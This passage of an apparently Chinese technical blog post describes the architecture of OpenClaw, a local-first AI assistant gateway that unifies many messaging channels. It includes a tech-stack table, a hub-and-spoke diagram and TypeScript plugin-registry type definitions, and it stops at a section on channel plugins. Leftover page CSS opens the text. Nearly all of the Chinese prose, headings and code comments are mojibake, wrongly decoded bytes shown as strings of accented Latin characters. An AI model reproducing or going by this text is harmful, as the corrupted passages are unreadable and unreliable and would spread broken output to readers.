li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">OpenClaw æ·±åº¦æŠ€æœ¯è§£æï¼šå¦‚ä½•ç”¨æ’ä»¶åŒ–ç½‘å…³æ¶æ„ç»Ÿä¸€ 30+ æ¶ˆæ¯æ¸ é“çš„ AI åŠ©æ‰‹</h2>
<blockquote>
<p>ä¸€ä¸ªæœ¬åœ°ä¼˜å…ˆã€éšç§æŒæ§ã€æ¨¡å‹æ— å…³çš„ä¸ªäºº AI åŠ©ç†å¹³å°â€”â€”ä»æ¶æ„å“²å­¦åˆ°å®ç°ç»†èŠ‚çš„å…¨é¢å‰–æ</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">å¼•è¨€ï¼šAI åŠ©æ‰‹çš„"å­¤å²›å›°å¢ƒ"</h3>
<p>2026 å¹´çš„ä»Šå¤©ï¼ŒAI åŠ©æ‰‹å·²ç»æ— å¤„ä¸åœ¨ã€‚ä½†ä¸€ä¸ªçŸ›ç›¾è¶Šæ¥è¶Šçªå‡ºï¼š<strong>AI è¶Šæ¥è¶Šå¼ºå¤§ï¼Œå´è¢«å›°åœ¨è¶Šæ¥è¶Šå¤šçš„"å­¤å²›"ä¸Š</strong>ã€‚</p>
<p>ä½ çš„ ChatGPT åªèƒ½åœ¨ OpenAI çš„ç•Œé¢ä½¿ç”¨ï¼›ä½ çš„ Claude åªèƒ½åœ¨ Anthropic çš„ç½‘é¡µé‡Œå¯¹è¯ï¼›è€Œä½ æ—¥å¸¸æ²Ÿé€šçš„æˆ˜åœºâ€”â€”WhatsAppã€Telegramã€Slackã€Discordã€é£ä¹¦ã€å¾®ä¿¡â€”â€”è¿™äº›æ‰æ˜¯ä½ çœŸæ­£çš„å·¥ä½œæµæ‰€åœ¨ï¼ŒAI å´æ— æ³•èå…¥ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸ªåœºæ™¯ï¼šä½ åœ¨ Telegram ä¸Šå’Œæœ‹å‹èŠåˆ°ä¸€ä¸ªæŠ€æœ¯é—®é¢˜ï¼Œæƒ³è®© AI å¸®å¿™åˆ†æä¸€ä¸‹ï¼Ÿåˆ‡æ¢åˆ°å¦ä¸€ä¸ª Appã€‚ä½ åœ¨ Slack çš„å·¥ä½œç¾¤é‡Œæ”¶åˆ°ä¸€ä¸ªç´§æ€¥éœ€æ±‚ï¼Œæƒ³è®© AI èµ·è‰å›å¤ï¼Ÿå†åˆ‡æ¢åˆ°å¦ä¸€ä¸ª Appã€‚ä½ åœ¨ Discord çš„æŠ€æœ¯ç¤¾åŒºçœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„è®¨è®ºï¼Œæƒ³è®© AI æ€»ç»“ä¸€ä¸‹ï¼Ÿåˆåˆ‡æ¢äº†ä¸€æ¬¡ã€‚</p>
<p><strong>OpenClaw</strong> æ­£æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜è€Œç”Ÿçš„å¼€æºé¡¹ç›®ã€‚å®ƒçš„æ„¿æ™¯å¾ˆç®€å•ä¹Ÿå¾ˆå¤§èƒ†ï¼š<strong>ä¸€ä¸ª AI åŠ©æ‰‹ï¼Œå­˜åœ¨äºä½ ä½¿ç”¨çš„æ‰€æœ‰æ¶ˆæ¯å¹³å°ä¸Šï¼Œæ•°æ®å®Œå…¨ç•™åœ¨ä½ è‡ªå·±çš„è®¾å¤‡ä¸Š</strong>ã€‚</p>
<p>æœ¬æ–‡å°†ä»æ¶æ„å“²å­¦ã€æ ¸å¿ƒæœºåˆ¶åˆ°å·¥ç¨‹å®è·µï¼Œå…¨é¢å‰–æ OpenClaw å¦‚ä½•å®ç°è¿™ä¸€æ„¿æ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€é¡¹ç›®å…¨æ™¯ï¼šå®šä½ä¸è®¾è®¡å“²å­¦</h3>
<h4 data-id="heading-3">1.1 ä¸‰ä¸ªæ ¸å¿ƒè®¾è®¡åŸåˆ™</h4>
<p>OpenClaw çš„è®¾è®¡å›´ç»•ä¸‰ä¸ªåšå®šçš„åŸåˆ™å±•å¼€ï¼š</p>
<p><strong>Local-Firstï¼ˆæœ¬åœ°ä¼˜å…ˆï¼‰</strong>ï¼šGateway é»˜è®¤ç»‘å®š <code>127.0.0.1</code>ï¼Œæ‰€æœ‰ä¼šè¯æ•°æ®ã€é…ç½®ã€Agent çŠ¶æ€å…¨éƒ¨å­˜å‚¨åœ¨æœ¬åœ° <code>~/.openclaw/</code> ç›®å½•ä¸‹ã€‚æ²¡æœ‰äº‘æœåŠ¡å™¨ï¼Œæ²¡æœ‰æ•°æ®ä¸Šä¼ ï¼Œç”¨æˆ·å¯¹è‡ªå·±çš„ AI åŠ©æ‰‹æ‹¥æœ‰å®Œå…¨çš„æŒæ§æƒã€‚</p>
<p><strong>Single-Userï¼ˆå•ç”¨æˆ·åŠ©ç†ï¼‰</strong>ï¼šè¿™ä¸æ˜¯ä¸€ä¸ªå¤šç§Ÿæˆ· SaaS å¹³å°ï¼Œè€Œæ˜¯ä¸€ä¸ªä¸“å±äºä½ çš„ä¸ªäºº AI åŠ©ç†ã€‚è¿™ç§å®šä½æå¤§åœ°ç®€åŒ–äº†æ¶æ„â€”â€”ä¸éœ€è¦ç”¨æˆ·ç®¡ç†ã€æƒé™éš”ç¦»ã€è®¡è´¹ç³»ç»Ÿï¼Œå¯ä»¥æŠŠæ‰€æœ‰å·¥ç¨‹èµ„æºèšç„¦åœ¨åšå¥½"ä¸€ä¸ªäººçš„ AI åŠ©æ‰‹"è¿™ä»¶äº‹ä¸Šã€‚</p>
<p><strong>Model-Agnosticï¼ˆæ¨¡å‹æ— å…³ï¼‰</strong>ï¼šä¸ç»‘å®šä»»ä½•ç‰¹å®šçš„ LLM æä¾›å•†ã€‚Anthropic Claudeã€OpenAI GPTã€Google Geminiã€AWS Bedrock ç”šè‡³æœ¬åœ°æ¨¡å‹éƒ½å¯ä»¥ä½œä¸ºæ¨ç†å¼•æ“ï¼Œä¸”æ”¯æŒè‡ªåŠ¨æ•…éšœè½¬ç§»ã€‚</p>
<h4 data-id="heading-4">1.2 æŠ€æœ¯æ ˆæ¦‚è§ˆ</h4>






































































<table><thead><tr><th>åˆ†ç±»</th><th>é€‰å‹</th><th>ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>è¿è¡Œæ—¶</td><td>Node.js (ESM)</td><td>â‰¥22.12.0</td></tr><tr><td>ä¸»è¯­è¨€</td><td>TypeScript</td><td>^5.9.3</td></tr><tr><td>åŒ…ç®¡ç†</td><td>pnpm (Monorepo)</td><td>10.23.0</td></tr><tr><td>HTTP æ¡†æ¶</td><td>Hono + Express</td><td>4.11.9 / ^5.2.1</td></tr><tr><td>WebSocket</td><td>ws</td><td>^8.19.0</td></tr><tr><td>Schema éªŒè¯</td><td>Zod + TypeBox + Ajv</td><td>^4.3.6 / 0.34.48 / ^8.17.1</td></tr><tr><td>æ„å»ºå·¥å…·</td><td>tsdown</td><td>^0.20.3</td></tr><tr><td>æµ‹è¯•æ¡†æ¶</td><td>Vitest (V8 è¦†ç›–ç‡)</td><td>^4.0.18</td></tr><tr><td>ä»£ç è§„èŒƒ</td><td>Oxlint + Oxfmt</td><td>^1.43.0 / 0.28.0</td></tr><tr><td>Web UI</td><td>Lit (Web Components)</td><td>^3.3.2</td></tr><tr><td>Agent SDK</td><td>@mariozechner/pi-coding-agent</td><td>0.52.9</td></tr><tr><td>å‘é‡æ•°æ®åº“</td><td>sqlite-vec</td><td>0.1.7-alpha.2</td></tr></tbody></table>
<p>å€¼å¾—ä¸€æçš„æ˜¯é¡¹ç›®é‡‡ç”¨<strong>æ—¥å†ç‰ˆæœ¬å·ï¼ˆCalVerï¼‰</strong>ï¼š<code>2026.2.6-3</code>ï¼Œæ ¼å¼ä¸º <code>YYYY.M.D-patch</code>ï¼Œè®©ç”¨æˆ·ä¸€çœ¼å°±èƒ½åˆ¤æ–­ç‰ˆæœ¬çš„æ—¶æ•ˆæ€§ã€‚</p>
<hr/>
<h3 data-id="heading-5">äºŒã€æ•´ä½“æ¶æ„ï¼šç½‘å…³å³æ§åˆ¶é¢</h3>
<h4 data-id="heading-6">2.1 "è½´è¾å¼"æ¶æ„</h4>
<p>OpenClaw çš„æ ¸å¿ƒæ¶æ„æ€æƒ³å¯ä»¥ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼š<strong>Gateway as Control Planeï¼ˆç½‘å…³å³æ§åˆ¶é¢ï¼‰</strong>ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„ <strong>Hub-and-Spokeï¼ˆè½´è¾å¼ï¼‰</strong> è®¾è®¡ã€‚Gateway ä½œä¸ºä¸­å¿ƒæ¢çº½ï¼Œæ‰€æœ‰æ¶ˆæ¯æ¸ é“ã€AI Agentã€å®¢æˆ·ç«¯åº”ç”¨éƒ½é€šè¿‡ WebSocket è¿æ¥åˆ°å®ƒï¼š</p>
<pre><code class="hljs language-scss" lang="scss">                        å®¢æˆ·ç«¯å±‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  macOS App â”‚ iOS Node â”‚ Android â”‚ CLI â”‚ Web  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â”‚ WebSocket
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚             Gateway æ§åˆ¶é¢ (Core)              â”‚
    â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
    â”‚  â”‚ WebSocketâ”‚ HTTP Serverâ”‚ Plugin Registry  â”‚  â”‚
    â”‚  â”‚ Server   â”‚ (Hono)     â”‚ (æ¸ é“/å·¥å…·/é’©å­) â”‚  â”‚
    â”‚  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
    â”‚  â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
    â”‚  â”‚         Gateway Runtime State            â”‚  â”‚
    â”‚  â”‚ Session â”‚ Config â”‚ Health â”‚ Cron â”‚ Nodes â”‚  â”‚
    â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â–¼                   â–¼                   â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ Channelâ”‚      â”‚   Pi Agent   â”‚      â”‚   LLM    â”‚
    â”‚ Pluginsâ”‚      â”‚  åµŒå…¥å¼è¿è¡Œå™¨  â”‚      â”‚ æä¾›å•†    â”‚
    â”‚ (<span class="hljs-number">30</span>+)  â”‚      â”‚              â”‚      â”‚ æ•…éšœè½¬ç§»  â”‚
    â””â”€â”€â”€â”¬â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ WhatsApp â”‚ Telegram â”‚ Slack â”‚ Discord â”‚ <span class="hljs-number">30</span>+  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-7">2.2 ä¸ºä»€ä¹ˆé€‰æ‹©ä¸­å¿ƒç½‘å…³ï¼Ÿ</h4>
<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿç››è¡Œçš„ä»Šå¤©ï¼Œé€‰æ‹©ä¸­å¿ƒåŒ–çš„ Gateway çœ‹ä¼¼"ä¸å¤Ÿå…ˆè¿›"ã€‚ä½†å¯¹äºä¸ªäºº AI åŠ©æ‰‹è¿™ä¸ªåœºæ™¯ï¼Œè¿™æ˜¯ä¸€ä¸ªæå…¶åŠ¡å®çš„å†³ç­–ï¼š</p>
<p><strong>å•ä¸€çŠ¶æ€æºï¼ˆSingle Source of Truthï¼‰</strong>ï¼šæ‰€æœ‰ä¼šè¯çŠ¶æ€é›†ä¸­åœ¨ Gateway ç®¡ç†ï¼Œå½»åº•é¿å…äº†åˆ†å¸ƒå¼ä¸€è‡´æ€§é—®é¢˜ã€‚å½“ä½ åœ¨ Telegram å‘äº†ä¸€æ¡æ¶ˆæ¯ï¼Œç„¶ååˆ‡æ¢åˆ° Slack ç»§ç»­èŠï¼ŒGateway èƒ½ä¿è¯ä½ çš„ä¸Šä¸‹æ–‡æ˜¯è¿è´¯çš„ã€‚</p>
<p><strong>åè®®ç»Ÿä¸€</strong>ï¼šæ— è®ºæ¶ˆæ¯æ¥è‡ª WhatsApp çš„ Baileys SDK è¿˜æ˜¯ Discord çš„ Carbon APIï¼Œä¸€æ—¦è¿›å…¥ Gatewayï¼Œå°±ç»Ÿä¸€ä½¿ç”¨å†…éƒ¨ JSON-RPC åè®®å¤„ç†ã€‚AI Agent å®Œå…¨ä¸éœ€è¦çŸ¥é“æ¶ˆæ¯æ¥è‡ªå“ªä¸ªæ¸ é“ã€‚</p>
<p><strong>éƒ¨ç½²ç®€åŒ–</strong>ï¼šæ¯å°ä¸»æœºåªè¿è¡Œä¸€ä¸ª Gateway å®ä¾‹ï¼Œæ‹¥æœ‰æ‰€æœ‰èµ„æºçš„ç‹¬å æ§åˆ¶æƒã€‚æ²¡æœ‰æœåŠ¡å‘ç°ã€æ²¡æœ‰è´Ÿè½½å‡è¡¡ã€æ²¡æœ‰å®¹å™¨ç¼–æ’â€”â€”<code>openclaw start</code> å°±èƒ½å¯åŠ¨ä¸€åˆ‡ã€‚</p>
<h4 data-id="heading-8">2.3 å…­å±‚åˆ†å±‚æ¶æ„</h4>
<p>ä»å®è§‚è§†è§’çœ‹ï¼Œæ•´ä¸ªç³»ç»Ÿå¯ä»¥åˆ’åˆ†ä¸ºå…­ä¸ªæ¸…æ™°çš„å±‚æ¬¡ï¼š</p>








































<table><thead><tr><th>å±‚çº§</th><th>èŒè´£</th><th>å…³é”®ç»„ä»¶</th></tr></thead><tbody><tr><td><strong>æ¥å…¥å±‚</strong></td><td>ä¸å„æ¶ˆæ¯å¹³å°å¯¹æ¥</td><td>Baileysã€grammYã€@slack/boltã€Carbon ç­‰</td></tr><tr><td><strong>ç½‘å…³å±‚</strong></td><td>æ¶ˆæ¯è·¯ç”±ã€ä¼šè¯ç®¡ç†ã€äº‹ä»¶åˆ†å‘</td><td>WebSocket RPCã€HTTP APIã€Hook ç³»ç»Ÿ</td></tr><tr><td><strong>è·¯ç”±å±‚</strong></td><td>å†³å®š"è°æ¥å¤„ç†è¿™æ¡æ¶ˆæ¯"</td><td>å¤šçº§è·¯ç”±ä¼˜å…ˆçº§ã€èº«ä»½é“¾æ¥ã€å¹¿æ’­ç»„</td></tr><tr><td><strong>Agent å±‚</strong></td><td>AI æ¨ç†ã€å·¥å…·è°ƒç”¨ã€æŠ€èƒ½æ‰§è¡Œ</td><td>Pi Agent è¿è¡Œæ—¶ã€æ²™ç®±ã€Canvas</td></tr><tr><td><strong>å›å¤å±‚</strong></td><td>å“åº”æ ¼å¼åŒ–ã€æµå¼è¾“å‡ºã€åˆ†å—ç­–ç•¥</td><td>ReplyDispatcherã€æ‰“å­—æŒ‡ç¤ºå™¨</td></tr><tr><td><strong>åŸºç¡€è®¾æ–½å±‚</strong></td><td>é…ç½®ã€å­˜å‚¨ã€æ—¥å¿—ã€å®‰å…¨</td><td>JSON5 + Zodã€SQLite + sqlite-vec</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-9">ä¸‰ã€æ’ä»¶åŒ–ä¸€åˆ‡ï¼šOpenClaw çš„æ¶æ„åŸºçŸ³</h3>
<h4 data-id="heading-10">3.1 Plugin Registryï¼šå…¨å±€æ³¨å†Œè¡¨</h4>
<p>å¦‚æœè¯´ Gateway æ˜¯ OpenClaw çš„å¿ƒè„ï¼Œé‚£ Plugin Registry å°±æ˜¯å®ƒçš„è¡€ç®¡ç³»ç»Ÿã€‚å‡ ä¹æ‰€æœ‰çš„æ‰©å±•èƒ½åŠ›â€”â€”æ¸ é“ã€å·¥å…·ã€é’©å­ã€HTTP è·¯ç”±ã€CLI å‘½ä»¤ã€AI æä¾›å•†â€”â€”éƒ½é€šè¿‡ç»Ÿä¸€çš„æ’ä»¶æ³¨å†Œè¡¨ç®¡ç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">PluginRegistry</span> = {
  <span class="hljs-attr">plugins</span>: <span class="hljs-title class_">PluginRecord</span>[];              <span class="hljs-comment">// æ’ä»¶å…ƒä¿¡æ¯</span>
  <span class="hljs-attr">tools</span>: <span class="hljs-title class_">PluginToolRegistration</span>[];      <span class="hljs-comment">// Agent å·¥å…·</span>
  <span class="hljs-attr">hooks</span>: <span class="hljs-title class_">PluginHookRegistration</span>[];      <span class="hljs-comment">// äº‹ä»¶é’©å­</span>
  <span class="hljs-attr">channels</span>: <span class="hljs-title class_">PluginChannelRegistration</span>[];<span class="hljs-comment">// é€šé“æ’ä»¶</span>
  <span class="hljs-attr">providers</span>: <span class="hljs-title class_">PluginProviderRegistration</span>[]; <span class="hljs-comment">// AI æä¾›å•†</span>
  <span class="hljs-attr">gatewayHandlers</span>: <span class="hljs-title class_">GatewayRequestHandlers</span>; <span class="hljs-comment">// Gateway RPC æ–¹æ³•</span>
  <span class="hljs-attr">httpHandlers</span>: <span class="hljs-title class_">PluginHttpRegistration</span>[];  <span class="hljs-comment">// HTTP å¤„ç†å™¨</span>
  <span class="hljs-attr">httpRoutes</span>: <span class="hljs-title class_">PluginHttpRouteRegistration</span>[];<span class="hljs-comment">// HTTP è·¯ç”±</span>
  <span class="hljs-attr">cliRegistrars</span>: <span class="hljs-title class_">PluginCliRegistration</span>[];  <span class="hljs-comment">// CLI å‘½ä»¤</span>
  <span class="hljs-attr">services</span>: <span class="hljs-title class_">PluginServiceRegistration</span>[];   <span class="hljs-comment">// åå°æœåŠ¡</span>
  <span class="hljs-attr">commands</span>: <span class="hljs-title class_">PluginCommandRegistration</span>[];   <span class="hljs-comment">// å‘½ä»¤å®šä¹‰</span>
  <span class="hljs-attr">diagnostics</span>: <span class="hljs-title class_">PluginDiagnostic</span>[];         <span class="hljs-comment">// è¯Šæ–­ä¿¡æ¯</span>
};
</code></pre>
<p>è¿™ä¸ªè®¾è®¡æœ‰ä¸‰ä¸ªç²¾å¦™ä¹‹å¤„ï¼š</p>
<p><strong>å…¨å±€å”¯ä¸€æ€§ä¿è¯</strong>ï¼šä½¿ç”¨ <code>Symbol.for("openclaw.pluginRegistryState")</code> å®ç°å…¨å±€å•ä¾‹ã€‚å³ä½¿åœ¨ ESM æ¨¡å—è¢«å¤šæ¬¡åŠ è½½çš„åœºæ™¯ä¸‹ï¼ˆè¿™åœ¨ Node.js monorepo ä¸­å¾ˆå¸¸è§ï¼‰ï¼Œä¹Ÿèƒ½ä¿è¯ Registry çš„å”¯ä¸€æ€§ã€‚</p>
<p><strong>å†²çªæ£€æµ‹</strong>ï¼šGateway æ–¹æ³•å’Œ HTTP è·¯ç”±çš„æ³¨å†Œä¼šè‡ªåŠ¨æ£€æµ‹é‡å¤ï¼Œé¿å…ä¸¤ä¸ªæ’ä»¶æ³¨å†ŒåŒåæ–¹æ³•å¯¼è‡´çš„éšæ€§ bugã€‚</p>
<p><strong>éš”ç¦»çš„ Plugin API</strong>ï¼šæ¯ä¸ªæ’ä»¶é€šè¿‡ <code>createApi()</code> å·¥å‚æ–¹æ³•è·å¾—ç‹¬ç«‹çš„ API æ¥å£ï¼Œé˜²æ­¢æ’ä»¶ä¹‹é—´äº’ç›¸å¹²æ‰°ã€‚</p>
<h4 data-id="heading-11">3.2 ä¸‰ç§æ’ä»¶ç±»å‹</h4>
<p>OpenClaw å°†æ’ä»¶åˆ†ä¸ºä¸‰ç§ç±»å‹ï¼Œå„æœ‰ä¸åŒçš„åŠ è½½æœºåˆ¶ï¼š</p>
<p><strong>å†…ç½®æ’ä»¶ï¼ˆBundledï¼‰</strong>ï¼šç›´æ¥ç¼–è¯‘è¿›æ ¸å¿ƒçš„ 7 ä¸ªæ¶ˆæ¯æ¸ é“ï¼ˆTelegramã€WhatsAppã€Discordã€Slackã€Signalã€iMessageã€WebChatï¼‰ï¼Œä»¥åŠæ ¸å¿ƒå·¥å…·å’Œé’©å­ã€‚</p>
<p><strong>æ‰©å±•æ’ä»¶ï¼ˆExtensionsï¼‰</strong>ï¼šä½äº <code>extensions/</code> ç›®å½•ä¸‹çš„ 30+ ä¸ªç‹¬ç«‹ npm åŒ…ï¼Œæ¯ä¸ªéƒ½æœ‰æ ‡å‡†ç»“æ„ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">extensions/&lt;plugin-name&gt;/
â”œâ”€â”€ package.json              <span class="hljs-comment"># ä¾èµ–å’Œå…ƒæ•°æ®</span>
â”œâ”€â”€ openclaw.plugin.json      <span class="hljs-comment"># æ’ä»¶æ¸…å• (æ³¨å†Œå£°æ˜)</span>
â”œâ”€â”€ index.ts                  <span class="hljs-comment"># å…¥å£ (å¯¼å‡ºæ³¨å†Œå‡½æ•°)</span>
â”œâ”€â”€ src/                      <span class="hljs-comment"># æºç </span>
â””â”€â”€ README.md
</code></pre>
<p><strong>å·¥ä½œåŒºæ’ä»¶ï¼ˆWorkspaceï¼‰</strong>ï¼šç”¨æˆ·è‡ªå®šä¹‰çš„æ’ä»¶ï¼Œæ”¾åœ¨ <code>~/.openclaw/plugins/</code> ç›®å½•ä¸‹ï¼Œæ”¯æŒçƒ­åŠ è½½ã€‚</p>
<h4 data-id="heading-12">3.3 Plugin APIï¼šæ’ä»¶çš„"å…¨èƒ½å·¥å…·ç®±"</h4>
<p>æ¯ä¸ªæ’ä»¶åœ¨æ³¨å†Œæ—¶ä¼šè·å¾—ä¸€ä¸ª <code>OpenClawPluginApi</code> å®ä¾‹ï¼Œå®ƒå‡ ä¹å¯ä»¥åšä»»ä½•äº‹æƒ…ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">OpenClawPluginApi</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">runtime</span>: <span class="hljs-title class_">PluginRuntime</span>;
  <span class="hljs-attr">logger</span>: <span class="hljs-title class_">PluginLogger</span>;
  
  <span class="hljs-comment">// æ³¨å†Œèƒ½åŠ›</span>
  <span class="hljs-title function_">registerTool</span>(tool, opts?): <span class="hljs-built_in">void</span>;             <span class="hljs-comment">// æ³¨å†Œ Agent å·¥å…·</span>
  <span class="hljs-title function_">registerHook</span>(events, handler, opts?): <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// æ³¨å†Œäº‹ä»¶é’©å­</span>
  <span class="hljs-title function_">registerHttpHandler</span>(handler): <span class="hljs-built_in">void</span>;          <span class="hljs-comment">// æ³¨å†Œ HTTP å¤„ç†å™¨</span>
  <span class="hljs-title function_">registerHttpRoute</span>(params): <span class="hljs-built_in">void</span>;             <span class="hljs-comment">// æ³¨å†Œ HTTP è·¯ç”±</span>
  <span class="hljs-title function_">registerChannel</span>(registration): <span class="hljs-built_in">void</span>;         <span class="hljs-comment">// æ³¨å†Œæ¶ˆæ¯æ¸ é“</span>
  <span class="hljs-title function_">registerProvider</span>(provider): <span class="hljs-built_in">void</span>;            <span class="hljs-comment">// æ³¨å†Œ AI æä¾›å•†</span>
  <span class="hljs-title function_">registerGatewayMethod</span>(method, handler): <span class="hljs-built_in">void</span>;<span class="hljs-comment">// æ³¨å†Œ Gateway RPC æ–¹æ³•</span>
  <span class="hljs-title function_">registerCli</span>(registrar, opts?): <span class="hljs-built_in">void</span>;         <span class="hljs-comment">// æ³¨å†Œ CLI å‘½ä»¤</span>
  <span class="hljs-title function_">registerService</span>(service): <span class="hljs-built_in">void</span>;              <span class="hljs-comment">// æ³¨å†Œåå°æœåŠ¡</span>
  <span class="hljs-title function_">registerCommand</span>(command): <span class="hljs-built_in">void</span>;              <span class="hljs-comment">// æ³¨å†Œå‘½ä»¤</span>
  <span class="hljs-title function_">on</span>(hookName, handler, opts?): <span class="hljs-built_in">void</span>;          <span class="hljs-comment">// ç±»å‹å®‰å…¨çš„äº‹ä»¶ç›‘å¬</span>
};
</code></pre>
<p>è¿™ç§"æ³¨å†Œä¸€åˆ‡"çš„è®¾è®¡æ„å‘³ç€ï¼Œä¸€ä¸ªæ’ä»¶å¯ä»¥åŒæ—¶ï¼šæ³¨å†Œä¸€ä¸ªæ–°çš„æ¶ˆæ¯æ¸ é“ã€ä¸º Agent æ·»åŠ å‡ ä¸ªä¸“å±å·¥å…·ã€æš´éœ²ä¸€ä¸ª HTTP webhookã€æ³¨å†Œä¸¤ä¸ª CLI å‘½ä»¤ã€æŒ‚è½½ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ã€‚æ’ä»¶çš„èƒ½åŠ›è¾¹ç•Œåªå–å†³äºå®ƒçš„æ³¨å†Œè¡Œä¸ºï¼Œè€Œéå…¶ç±»å‹æ ‡ç­¾ã€‚</p>
<hr/>
<h3 data-id="heading-13">å››ã€æ¸ é“ç³»ç»Ÿï¼šç»Ÿä¸€ 30+ æ¶ˆæ¯å¹³å°çš„å·¥ç¨‹æŒ‘æˆ˜</h3>
<h4 data-id="heading-14">4.1 ChannelPluginï¼šå¤šé€‚é…å™¨ç»„åˆå¥‘çº¦</h4>
